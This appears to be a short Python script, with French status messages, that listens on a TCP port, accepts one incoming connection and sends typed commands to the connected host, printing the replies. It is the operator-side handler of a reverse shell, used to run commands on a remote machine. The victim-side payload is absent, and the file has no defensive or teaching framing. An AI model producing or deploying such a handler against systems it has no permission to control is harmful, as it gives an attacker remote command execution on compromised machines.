import socket
import subprocess
import sys

host = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)

print("Listening en cours sur %s:%d" % (host, port))

conn, addr = s.accept()
print("[+] Connection établie avec l'hôte : %s" % str(addr[0]))

while True:
    command = input("#> ")
    if command != "exit":
        if command == "":
            continue
        conn.send(command.encode())
        result = conn.recv(1024).decode()
        print(result.rstrip("\n"))
    else:
        conn.send("exit".encode())
        print("[+] Connection fermée")
        break

s.close()
